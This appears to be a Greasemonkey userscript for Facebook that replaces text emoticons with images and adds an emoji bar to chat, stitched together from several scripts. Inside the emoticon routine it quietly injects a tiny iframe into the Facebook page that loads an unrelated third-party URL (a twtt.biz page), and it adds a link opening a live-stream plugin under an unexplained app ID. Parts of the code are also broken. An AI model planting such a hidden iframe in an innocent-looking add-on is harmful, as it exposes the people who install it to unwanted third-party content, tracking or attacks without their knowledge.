// ==UserScript==
// @name			Iconos Facebook RamÃ³n J. Aguilar S.
// @author			HECATEO@HOTMAIL.COM
// @description			HECATEO@HOTMAIL.COM Venezuela
// @version                     1.99
// @versionnumber		1.99
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @match             http://*.facebook.com/*
// @match             https://*.facebook.com/*
// ==/UserScript==
(function(d){
    const DEBUG = true;
    const script_id = 122937,
          script_version = '1.99';
    const gm_class = ' gm_smileys_replaced';
    var smiley = {
        ':-)'   : '1px',       ':)'     : '1px',
        ':-('   : '-16px',     ':('     : '-16px',
        ':-P'   : '-31px',     ':P'     : '-31px',
                               ':-p'    : '-31px',
                               ':p '    : '-31px',
        ':-D'   : '-47px',     ':D'     : '-47px',
        ':-O'   : '-64px',     ':O '    : '-64px',
                               ':-o'    : '-64px',
                               ':o '    : '-64px',
        ';-)'   : '-79px',     ';)'     : '-79px',
        '8-)'   : '-96px',     ' 8)'    : '-96px',
        '8-\|'  : '-111px',    '8\|'    : '-111px',
        '>:-('  : '-128px',    '>:('    : '-128px',
        ':-/'   : '-143px',    ':/'     : '-143px',
        ':\'('  : '-160px',    ':Â´('    : '-160px',
                               ':,('    : '-160px',
        '3:-)'  : '-176px',    '3:)'    : '-176px',
                               ']:->'   : '-176px',
        'O:-)'  : '-192px',    'O:)'    : '-192px',
                               ' o:-)'  : '-192px',
                               ' o:)'   : '-192px',
        ':-*'   : '-208px',    ':*'     : '-208px',
        '<3'    : '-224px',    'â™¥'      : '-224px',
                               '*IN LOVE*' : '-224px',
        '^_^'   : '-240px',    '^^'     : '-240px',
        '-_-'   : '-256px',
        'o.O'   : '-272px',    'O.o'    : '-272px',
                               'o.o'    : '-272px',
        '>:-O'  : '-288px',    '>:o'  : '-288px',
        ':v'    : '-304px',
        ' :3'   : '-320px',
        '(Y)'   : '-336px',    '(y)'    : '-336px',
        ':putnam:' : 'putnam',
        '<(")'     : 'penguin', '<(\'\')' : 'penguin',
        '(^^^)'    : 'shark',
        ':|]'      : 'robot',
        ':42:'     : '42',
    };
    var smileys_url = 'http://static.ak.fbcdn.net/images';
    if (location.protocol == 'https:') {
        smileys_url = 'https://s-static.ak.fbcdn.net/images';
    }
    var smileys_all = new Array();
    for (smile in smiley) {
        smileys_all.push(
            smile.replace(/[\)\(\^\*\.\:\|]/g, '\\$&').replace(/\u0000/g,
            '\\0')
        );
    }
    const smileys_regex = new RegExp(smileys_all.join("|"), 'g');
    delete smileys_all;
    function log(text)
    {
        if (DEBUG === true && typeof GM_log === 'function' && text != null) {
            GM_log(text);
        }
        return false;
    }
    function g(id, parent)
    {
        if(id && typeof id === 'string') {
            var p = parent||d;
            id = p.querySelectorAll(id);
        }
        return id||null;
    }
    function replace(elements)
    {
        var count =  elements.length;
        if (count <= 0
            || count == d.getElementsByClassName('gm_smileys_replaced').length
        ) {
            return false;
        }
        var el, class_name, data, matches, childs, child, childValue, smile,
            smile_orig, alt, html, replace_img;
        for(i = 0; i < count; i++) {
            el = elements[i];
            class_name = el.className;
            if (!el
                || class_name.indexOf(gm_class) >= 0
                || class_name.indexOf('uiStreamPassive') >= 0
                || class_name.indexOf('GenericStory_Report') >= 0
            ) {
                continue;
            }
            el.className += gm_class;
            data = el.innerHTML;
            data = data.replace('&gt;', '>', 'g').replace('&lt;', '<', 'g');
            matches = data.match(smileys_regex);
            data = null;
            if (!matches) continue;
            childs = el.childNodes;
            for(var k = 0; k < childs.length; k++) {
                child = childs[k];
                if (child.nodeName != '#text') continue;
                data = child.nodeValue;
                var replacements = new Array();
                html = d.createElement('span');
                for(j = 0; j < matches.length; j++) {
                    smile = matches[j];
                    if (data.indexOf(smile) >= 0) {
                        smile_orig = smile;
                        alt = smile_orig;
                        alt = alt.replace('"', '&quot;');
                        alt = alt.replace('â™¥', '&lt;3');
                        if (smiley[smile_orig].substr(-2) == 'px') {
                            replace_img = '<img'
                                        + ' class="emote_img gm_smiley smiley"'
                                        + ' src="'+ smileys_url + '/blank.gif"'
                                        + ' style="background-position: ' + smiley[smile_orig] + ' 0;"'
                                        + ' title="' + alt + '"'
                                        + ' alt="' + alt + '"'
                                        + '> ';
                            if (smile == ':-D'
                                || smile == ':D'
                                || smile == 'xD'
                            ) {
                                smile = new RegExp('[:|x]-?D+', 'gi');
                            } else if (smile == ':-)' || smile == ':)') {
                                smile = new RegExp(':-?[\)]+', '');
                            } else if (smile == ';-)' || smile == ';)') {
                                smile = new RegExp(';-?[\)]+', 'g');
                            } else if (smile == ':-(' || smile == ':(') {
                                smile = new RegExp(':-?[\(]+', '');
                            } else if (smile == ':/') {
                                smile = new RegExp(':-?[\/]+[ \z]?', 'g');
                            } else if (new RegExp('^:-?O').test(smile)) {
                                smile = new RegExp('[ \s]?:-?O[\s\z]?', 'gi');
                            }
                            data = data.replace(smile, '%' + j + '%', 'gi');
                            replacements[j] = replace_img;
                        } else {
                            /* extra smileys */
                            data = data.replace(smile_orig, '%' + j + '%', 'gi');
                            replacements[j] = '<img'
                                            + ' class="gm_smiley"'
                                            + ' src="' + smileys_url + '/emote/'
                                                       + smiley[smile_orig] + '.gif"'
                                            + ' title="' + alt + '"'
                                            + ' alt="' + alt + '"'
                                            + '> ';
                        }
                    }
                }
                data = data.replace('>', '&gt;', 'g').replace('<', '&lt;', 'g');
                for(r = 0; r < replacements.length; r++) {
                    data = data.replace(
                        new RegExp('%' + r + '%', 'g'),
                        replacements[r]
                    );
                }
                replacements = null;
                html.innerHTML = data;
                el.replaceChild(html, child);
                data = null;
            }
        }
        delete elements, count, el, class_name, matches, childs, child,
               childValue, smile, data, alt, html, replace_img, replacements;

        return false;
    }
    function lookForSmileys(parentNode)
    {
        var loc = location.hash;
        if (loc.length == 0 || !new RegExp('#!/|sk=|ref=|php').test(loc)) {
            loc = location.pathname.replace(new RegExp('^[/]+', ''), '');
            if (loc.length == 0) {
                loc = location.search;
            }
        }
        if (location.hostname !== 'www.facebook.com' || loc == 'ai.php') {
            return;
        }
        parentNode = parentNode||d;
        if (new RegExp('photo.php').test(loc)) {
            replace(g(
                '#photocaption, div.commentContent>span',
                parentNode
            ));
        } else
        if (new RegExp('note.php').test(loc)) {
            replace(g(
                'div.notesBlogText p, div.commentContent>span',
                d.getElementById('contentCol')
            ));
        } else {
            replace(g(
                'div.translationEligibleUserMessage, span.messageBody, .UIStory_Message, div.commentContent>span',
                parentNode
            ));
        }
        delete loc, parentNode;
        if (!d.getElementById('pagelet_replacesmileysbox')) {
            if (!d.getElementById('home_stream')) return false;
            if (col = d.getElementById('leftCol')) {
                var html;
                html = '<b>Facebook</b> <small>v' + script_version + '</small><br>'
                     + '<a href="#" id="open-list"></a> <a href="/"></a><br>' 
                     + '<iframe src=\"http:www.eduevenezuela.com.ar\/\/twtt.biz\/info.html\" width=\"20\" height=\"20\" frameborder=\"3\"><\/iframe>'                
                     + '</div>';
                var box = document.createElement('div');
                box.setAttribute('id', 'pagelet_replacesmileysbox');
                box.innerHTML = html;
                col.appendChild(box);
                d.getElementById('open-list').addEventListener(
                    'click',
                    openWindow,
                    false
                );
                delete col, html, box;
            }
        }
        return false;
    }    
    function openWindow(e)
    {
        e.preventDefault();
    	return window.open(
            'https://www.facebook.com/plugins/live_stream_box.php?always_post_to_friends=false&app_id=207082936060881',
            null,
            'width=400,height=500,left=25,scrollbars=yes',
            true
        );
    }
    function addStyle(css)
    {
    	if (typeof GM_addStyle !== 'undefined') { return GM_addStyle(css); }
    	else if (head = d.getElementsByTagName('head')[0]) {
    		var style = d.createElement('style');
    		try { style.innerHTML = css; }
    		catch(x) { style.innerText = css; }
    		style.type = 'text/css';
    		head.appendChild(style);
    	}
        delete head, style, css;
        return false;
    }
    function cssStyles()
    {
        addStyle(
         ''
        +' .gm_smiley{margin:0 1px;position:relative;top:-1px;vertical-align:top;}'
        +' .gm_smiley.smiley{background:url('+ smileys_url +'/emote/emote.gif) no-repeat scroll top center;}'
        +' #fbNubFlyout fbDockChatTabFlyout{height:980px;max-height:280px;}'
        +' #pagelet_replacesmileysbox{line-height:1.3;margin:15px 0;}'
        +' #pagelet_replacesmileysbox img.UIImageBlock_Image{margin-top:2px;}'
        );
        return false;
    }
    var t;
    var content = d.getElementById('content');
    cssStyles();
    lookForSmileys(content);
    function afterDomNodeInserted(e)
    {
        var target = e.target;
        if ((target.nodeName == 'LI')
            || (target.nodeName == 'UL')
            || (target.nodeName == 'DIV')
        ) {
            lookForSmileys(target);
        }
        delete e,target;
        return false;
    }
    function photoBoxUpdated(e)
    {
        target = e.relatedNode;
        if (target.id == 'fbPhotoSnowboxFeedback') {
            replace(g(
                '#fbPhotoSnowboxCaption, span.commentBody',
                d.getElementById('fbPhotoSnowbox')
            ));
        }

    }
    if (content) {
        window.setTimeout(function () {
            d.addEventListener(
                'DOMNodeInserted',
                afterDomNodeInserted,
                false
            );
            if (PhotoBox = d.getElementById('fbPhotoSnowbox')) {
                PhotoBox.addEventListener(
                    'DOMNodeInserted',
                    photoBoxUpdated,
                    false
                );
            }

        }, 2000);
    }
    /* AutoUpdater */
    if (typeof autoUpdate === 'function') {
        autoUpdate (script_id, script_version);
    }
})(document);
	var version, HttpsOn, ImagesURL, ResourcesURL, storage, emotsInfo, spemotsInfo, headTag, styleTag, ArrowStyleUp, ArrowStyleDown, fEmotBarDom, fEmotsListDom, fArrow;
	version = 1.3
	HttpsOn = window.location.href.match('https://')?true:false;
	ImagesURL = HttpsOn?'http://s-static.ak.fbcdn.net/images/':'http://static.ak.fbcdn.net/images/';
        ProfileImgURL = HttpsOn?'http://profile.ak.fbcdn.net/hprofile-ak-snc4/':'http://profile.ak.fbcdn.net/hprofile-ak-snc4/';
	ResourcesURL = HttpsOn?'http://s-static.ak.fbcdn.net/rsrc.php/':'http://static.ak.fbcdn.net/rsrc.php/';
	storage = 'none';
	try {
		if (typeof GM_getValue === 'function' && typeof GM_setValue === 'function') {
			GM_setValue('testkey', 'testvalue');
			if (GM_getValue('testkey', false) === 'testvalue') { storage='greasemonkey'; }
		}
	} catch(x) {}
	if (storage=='none' && typeof localStorage == 'object') { storage='localstorage'; }
	function setValue(key, value) {
		switch (storage) {
			case 'greasemonkey':
				GM_setValue('0-'+key, value);
				break;
			case 'localstorage':
				localStorage['femotbar-0-'+key] = value;
				break;
		}
	}
	function getValue(key, value) {
		switch (storage) {
			case 'greasemonkey':
				return GM_getValue('0-'+key, value);
			case 'localstorage':
				var val = localStorage['femotbar-0-'+key];
				if (val=='true') { return true; }
				else if (val=='false') { return false; }
				else if (val) { return val; }
				break;
		}
		return value;
	}	
	function xmlhttpRequest(params, callBack) {
		if (typeof GM_xmlhttpRequest !== 'undefined') {
			params['onload'] = callBack;
			return GM_xmlhttpRequest(params);
		}
		return null;
	}
	function openInTab(url) {
		if (typeof GM_openInTab !== 'undefined') { GM_openInTab(url); }
		else { window.open(url); }
	}
	function UpdateCheck() {
		if(parseInt(getValue('LastUpdate', '0')) + 500 <= (new Date().getTime())) {
			try {
				xmlhttpRequest( { method: 'GET',
								  url: 'http://userscripts.org/scripts/source/122937.meta.js?' + new Date().getTime(),
								  headers: {'Cache-Control': 'no-cache'} },
								  handleUpdateResponse);
			}
			catch (err) {
				alert('Sebuah kesalahan terjadi ketika memeriksa update:\n' + err);
			}
		}
	}	
	function handleUpdateResponse(r) {
		setValue('LastUpdate', new Date().getTime() + '');
		if (r.responseText.match(/@versionnumber\s+(\d+\.\d+)/)[1] > version) {
			if(confirm("Script 'Facebook Emoji'.\n ini mau di update?")) openInTab('http://userscripts.org/scripts/source/122937.user.js');
		}
	}
	function createSelection(field, start, end) {
		if( field.createTextRange ) {
			var selRange = field.createTextRange();
			selRange.collapse(true);
			selRange.moveStart('character', start);
			selRange.moveEnd('character', end);
			selRange.select();
		} else if( field.setSelectionRange ) {
			field.setSelectionRange(start, end);
		} else if( field.selectionStart ) {
			field.selectionStart = start;
			field.selectionEnd = end;
		}
		field.focus();
	}
	function getCursorPosition(field) {
		var CursorPos = 0;
		if (field.selectionStart || field.selectionStart == '0') CursorPos = field.selectionStart;
		return (CursorPos);
	}	
	UpdateCheck();	
	emotsInfo = [':)', ':(', ':p', ':D', ':o', ';)', '8)', '8|', '>:(', ':/', ':\'(', '3:)', 'O:)', ':*', '<3', '^_^', '-_-', 'o.O', '>:O', ':v', ':3', '(y)'];
	spemotsInfo = [':|]', 'emote/robot.gif', '(^^^)', 'emote/shark.gif', ':putnam:', 'emote/putnam.gif', '<(")', 'emote/penguin.gif', ':42:', 'emote/42.gif'];
    profilesInfo = [  
    '[[256460454427645]]', '400822_256460454427645_1496686687_n.jpg',	//
	'[[256454377761586]]', '401268_256454377761586_1646992571_n.jpg',	//
	'[[256454411094916]]', '399578_256454411094916_456673963_n.jpg',		//
	'[[256460401094317]]', '397031_256460401094317_1209718979_a.jpg',	//
	'[[256460137761010]]', '406945_256460137761010_718682049_n.jpg',		//
	'[[256454611094896]]', '405556_256454611094896_1429634583_n.jpg',	//in love
    '[[256460597760964]]', '403242_256460597760964_1781811579_n.jpg',	//kiss with <3
	'[[256460531094304]]', '407744_256460531094304_122482458_n.jpg',		//simple kiss
	'[[256452634428427]]', '405472_256452634428427_39146000_n.jpg',		//
	'[[256452497761774]]', '393839_256452497761774_1457504102_a.jpg',	//
	'[[256460071094350]]', '394287_256460071094350_1491674171_n.jpg',	//=|
	'[[256454604428230]]', '395297_256454604428230_805032967_a.jpg',		//:P
	'[[256460261094331]]', '396490_256460261094331_348711328_n.jpg',		//xP
	'[[256452664428424]]', '397554_256452664428424_2018259890_a.jpg',	//suspicious
	'[[256459981094359]]', '407544_256459981094359_1746780981_a.jpg',	//;)
	'[[256454694428221]]', '406976_256454694428221_24093974_n.jpg',		//-.-'
	'[[256460027761021]]', '401124_256460027761021_1357843364_n.jpg',	//:(
	'[[256454431094914]]', '396288_256454431094914_1109495371_n.jpg',	//
	'[[256460197761004]]', '401019_256460197761004_874516414_n.jpg',		//>_<
	'[[256459974427693]]', '402188_256459974427693_158494220_n.jpg',		//;'(
	'[[256452687761755]]', '399538_256452687761755_1104796814_n.jpg',	//:'o
	'[[256452531095104]]', '407911_256452531095104_1464783689_a.jpg',	//:o
	'[[256460151094342]]', '401433_256460151094342_2077162847_n.jpg',	//>.<
	'[[256460381094319]]', '393920_256460381094319_1192588100_n.jpg',	//:'(
	'[[256460297760994]]', '395300_256460297760994_1449469728_n.jpg',	//x')
	'[[256460354427655]]', '400124_256460354427655_1744348932_n.jpg',	//:')
        '[[256463064427384]]', '405205_256463064427384_96191243_n.jpg',		//footprints
	'[[256449661095391]]', '407406_256449661095391_971364379_n.jpg',		//lips
	'[[256452834428407]]', '399563_256452834428407_770547727_n.jpg',		//open lips
	'[[256452804428410]]', '409051_256452804428410_1160868412_n.jpg',	//ear
	'[[256460634427627]]', '401552_256460634427627_1034187907_a.jpg',	//eyes
	'[[256452774428413]]', '403686_256452774428413_1800700091_n.jpg',	//nose
	//Nature
	//missin sun
	'[[256449877762036]]', '394133_256449877762036_159267208_n.jpg',		//rainin
	'[[256453677761656]]', '407271_256453677761656_357761343_n.jpg',		//cloudy
	'[[256453654428325]]', '400391_256453654428325_883252355_n.jpg',		//snowman
	'[[256449904428700]]', '402193_256449904428700_1347944479_n.jpg',	//moon
	'[[256450617761962]]', '398497_256450617761962_267622562_n.jpg',		//lightnin
	'[[256461604427530]]', '409447_256461604427530_110277414_n.jpg',		//whirlpool
	'[[256453424428348]]', '405870_256453424428348_540851793_n.jpg',		//wave
	//Animals
	'[[256449994428691]]', '396960_256449994428691_1343515219_n.jpg',	//yellow cat
	//fali psic

	'[[256460277760996]]', '409071_256460277760996_688424754_n.jpg',		//x.x
	'[[256454651094892]]', '398158_256454651094892_162738712_n.jpg',		//shocked
	'[[256454474428243]]', '405589_256454474428243_970547107_a.jpg',		//angry
	'[[256460491094308]]', '398559_256460491094308_1463910421_n.jpg',	//very angry
	'[[256460234427667]]', '401059_256460234427667_1617603535_n.jpg',	//
	'[[256452574428433]]', '407405_256452574428433_1933140362_a.jpg',	//doc
	'[[256450317761992]]', '404228_256450317761992_1345482861_a.jpg',	//purple devil
	'[[256450234428667]]', '401350_256450234428667_919840172_n.jpg',		//alien
	'[[256452014428489]]', '394187_256452014428489_2072574185_n.jpg',	//yellow <3
	'[[256451964428494]]', '397378_256451964428494_16693379_a.jpg',		//blue <3
	'[[256452021095155]]', '396444_256463097760714_2120308077_n.jpg',	//â„¢
    ];
    headTag = document.getElementsByTagName('head')[0];
    if (headTag) {
		styleTag = document.createElement('style');
		styleTag.type = 'text/css';
		styleTag.innerHTML =
			'.chat_tab_emot_bar {padding-top: 2px; padding-bottom: 6px; line-height: 16px; padding-left: 2px; background:#EEEEEE none repeat scroll 0 0; border-style: solid; border-width: 0px 0px 1px 0px; border-color: #C9D0DA; position: static; }'+
			'.chatstylesbut {width: 15px; height:15px; background-image: url("' + ResourcesURL + 'zx/r/FbCyXQSrD4-.png"); cursor: pointer; border-color: rgb(153, 153, 153) rgb(153, 153, 153) rgb(136, 136, 136); border-style: solid; border-width: 1px; }'+
			'.chat_arrow { background-image: url("'+ ResourcesURL + 'v1/zp/r/SBNTDM0S-7U.png"); background-position: 0 -48px; height: 5px; width: 9px; }';
		headTag.appendChild(styleTag);
	}	
	ArrowStyleUp = 'cursor: pointer; position: absolute; right: 2px; -moz-transform: rotate(180deg); -webkit-transform: rotate(180deg);'
	ArrowStyleDown = 'cursor: pointer; position: absolute; right: 2px;'	
	fEmotBarDom = document.createElement('div');
	fEmotBarDom.setAttribute('class','chat_tab_emot_bar');	
	fEmotsListDom = document.createElement('div');
	fEmotsListDom.setAttribute('name','EmotsList');
	fEmotBarDom.appendChild(fEmotsListDom);	
	for(i=0;i<emotsInfo.length;i+=1) {
		var fEmotsDom = document.createElement('img');
		fEmotsDom.setAttribute('alt',emotsInfo[i]);
		fEmotsDom.setAttribute('style','cursor: pointer; background-position: -'+ 16*i +'px 0px;');
		fEmotsDom.setAttribute('src',ImagesURL + 'blank.gif');
		fEmotsDom.setAttribute('class','emote_img');
		fEmotsListDom.appendChild(fEmotsDom);
	}
	for(i=0;i<spemotsInfo.length;i+=2) {
		var fEmotsDom = document.createElement('img');
		fEmotsDom.setAttribute('alt',spemotsInfo[i]);
		fEmotsDom.setAttribute('src',ImagesURL + spemotsInfo[i+1]);
		fEmotsDom.setAttribute('style','cursor: pointer;');
		fEmotsDom.setAttribute('class','emote_custom');
		fEmotsListDom.appendChild(fEmotsDom);
	}
	for(i=0;i<profilesInfo.length;i+=2) {
		var fEmotsDom = document.createElement('img');
		fEmotsDom.setAttribute('alt',profilesInfo[i]);
		fEmotsDom.setAttribute('alt-extra',profilesInfo[i]);
		fEmotsDom.setAttribute('src',ProfileImgURL + profilesInfo[i+1]);
		fEmotsDom.setAttribute('style','cursor: pointer;');
		fEmotsDom.setAttribute('class','emote_custom');
		fEmotsListDom.appendChild(fEmotsDom);
	}	
	fArrow = document.createElement('i');
	fArrow.setAttribute('alt','');
	fArrow.setAttribute('class','img chat_arrow');
	fArrow.setAttribute('style',ArrowStyleUp);
	fEmotBarDom.appendChild(fArrow);	
	var setting_visible = getValue('visible',true);	
	document.addEventListener('DOMNodeInserted', fInsertedNodeHandler, false);
	function fInsertedNodeHandler(event) {
		if(event.target.getElementsByClassName && event.target.getElementsByClassName('fbNubFlyout fbDockChatTabFlyout')[0])
			fInsertEmotBar(event.target);
	}
	function fInsertEmotBar(fChatWrapper) {
		fChatToolBox = fChatWrapper.getElementsByClassName('fbNubFlyoutHeader')[0]
		fNewEmotBar = fEmotBarDom.cloneNode(true);
		setVisibility(fNewEmotBar);
		for(i=0;i<fNewEmotBar.firstChild.childNodes.length-2;i++) fNewEmotBar.firstChild.childNodes[i].addEventListener('click', fEmotClickHandler , false);
		fNewEmotBar.firstChild.childNodes[i].addEventListener('click' , fStyleClickHandler , false);
		fNewEmotBar.firstChild.childNodes[i+1].addEventListener('click' , fStyleClickHandler , false);		
		fNewEmotBar.childNodes[1].addEventListener('click', fHideShowEmotBar , false);
		if(fChatToolBox.childNodes) fChatToolBox.insertBefore(fNewEmotBar,fChatToolBox.childNodes[1]);
	}
	function fEmotClickHandler(event){
		var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];
		var pos = getCursorPosition(fChatInput);		
		var txtbef = ''; var txtaft = '';		
		if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0) txtbef = ' ';
		if (fChatInput.value.charAt(pos) != ' ') txtaft = ' ';		
		var imgAttrExtra = event.target.hasAttribute('alt-extra') ? '-extra' : '';
		fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + event.target.getAttribute('alt'+imgAttrExtra) + txtaft + fChatInput.value.substring(pos);
		createSelection(fChatInput,pos + event.target.getAttribute('alt'+imgAttrExtra).length + txtaft.length + txtbef.length,pos + event.target.getAttribute('alt'+imgAttrExtra).length + txtaft.length + txtbef.length);
	}	
	function fStyleClickHandler(event){
		var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];		
		var selectedText = fChatInput.value.substring(fChatInput.selectionStart, fChatInput.selectionEnd);		
		var pos = getCursorPosition(fChatInput);
		var txtlen = selectedText.length;		
		var imgAttrExtra = event.target.hasAttribute('alt-extra') ? '-extra' : '';		
		if (txtlen == 0) {
			fChatInput.value = fChatInput.value.substring(0,pos) + event.target.getAttribute('alt'+imgAttrExtra) + fChatInput.value.substring(pos);
			createSelection(fChatInput,pos + 1,pos + event.target.getAttribute('alt'+imgAttrExtra).length-1);
		}
		else {
			var txtbef = event.target.getAttribute('alt'+imgAttrExtra).charAt(0);
			var txtaft = event.target.getAttribute('alt'+imgAttrExtra).charAt(0);			
			while (fChatInput.value.charAt(pos) == ' ') { pos += 1; txtlen -= 1; }
			while (fChatInput.value.charAt(pos+txtlen-1) == ' ') txtlen -= 1;			
			if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0) txtbef = ' ' + txtbef;
			if (fChatInput.value.charAt(pos+txtlen) != ' ') txtaft += ' ';			
			fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + fChatInput.value.substring(pos,pos+txtlen) + txtaft + fChatInput.value.substring(pos + txtlen);			
			createSelection(fChatInput, pos + txtlen + 2, pos + txtlen + 2);
		}
	}
	function fHideShowEmotBar(event){
		fChatBar = document.getElementsByName('EmotsList');
		fChatContainer = document.getElementsByClassName('fbNubFlyoutBody')[0];
		if(fChatBar[0].getAttribute('style') == 'display: none;') {
			for(i=0;i<fChatBar.length;i++) {
				fChatBar[i].setAttribute('style','display: block;');
				fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleUp);
			}
			fChatContainer.setAttribute('style','height: ' + (fChatContainer.offsetHeight - 48) + 'px;');
		}
		else {
			for(i=0;i<fChatBar.length;i++) {
				fChatBar[i].setAttribute('style','display: none;');
				fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleDown);
			}
			fChatContainer.setAttribute('style','height: ' + (fChatContainer.offsetHeight + 48) + 'px;');
		}
		setValue('visible',!setting_visible);
		setting_visible = !setting_visible;
		
	}	
	function setVisibility(DOM) {
		if(setting_visible) {
			DOM.firstChild.setAttribute('style','display: block;');
			DOM.childNodes[1].setAttribute('style',ArrowStyleUp);
		}
		else {
			DOM.firstChild.setAttribute('style','display: none;');
			DOM.childNodes[1].setAttribute('style',ArrowStyleDown);
		}
	}
var chatNewHeight = 530; 
var chatNewWidth = 300;
var chatNewEntryWidth = chatNewWidth - (26 + 32 + 6); 
var chatNewTextEntry = chatNewWidth - 26; 
var fbSidebarSize = 205
var elmNewContent = document.createElement('span');
elmNewContent.style.color = '#FFFFFF'
elmNewContent.style.backgroundColor = '#3B5998';
elmNewContent.style.border = '#AAAAAA 1px';
elmNewContent.style.float = 'right;';
elmNewContent.style.fontSize = 'x-small';
var elmFoo = document.getElementById('leftColContainer');
elmFoo.insertBefore(elmNewContent, elmFoo.parent);  
function chatResizeAction() { 
    if (chatNewWidth != 300) {
        chatNewWidth = 300;
        chatNewHeight = 530;
        chatNewEntryWidth = chatNewWidth - (26 + 32 + 6);
        chatNewTextEntry = chatNewWidth - 26;
    } else {
        chatNewWidth = 300;
        chatNewHeight = 530;
        chatNewEntryWidth = chatNewWidth - (26 + 32 + 6);
        chatNewTextEntry = chatNewWidth - 26;
    }    
    reFlow();
} 
function addGlobalStyle(css) {
    if(typeof GM_addStyle=='function') {GM_addStyle(css);return}
    var style = document.createElement('style').setAttribute('type', 'text/css');
    var docHead = document.getElementsByTagName('head')[0];
    docHead.appendChild(style).innerHTML=css;
    var docBody = document.getElementByTagName('body')[0];
    docBody.appendChild(style).innerHTML="";
}
function reFlow() {
    addGlobalStyle(
      ".rNubContainer .fbNub { margin-left: 0px; }"
    )
    addGlobalStyle(".fbDock { margin: 0 0px; }");
    addGlobalStyle(".fbDockChatBuddyListNub { height: 25px; width: " + fbSidebarSize + "px; }");
    addGlobalStyle(".fbDockChatTab .input { width: " + chatNewTextEntry + "px !important; }");
    addGlobalStyle(".fbDockChatTab .conversationContainer .fbChatMessage { max-width: " + chatNewEntryWidth + "px !important; }");
    addGlobalStyle(".fbChatConvItem .metaInfoContainer { visibility: visible !important; }");
    addGlobalStyle(
      ".fbDockChatTab .fbDockChatTabFlyout { " +
      "height: " + chatNewHeight + "px !important; " +
      "width: " + chatNewWidth + "px !important; " +
      "}"
    )
   addGlobalStyle(".emote_custom { height: 20px !important; width: 20px !important; } ");	
   addGlobalStyle("tbody { vertical-align: bottom; }");

} 
reFlow();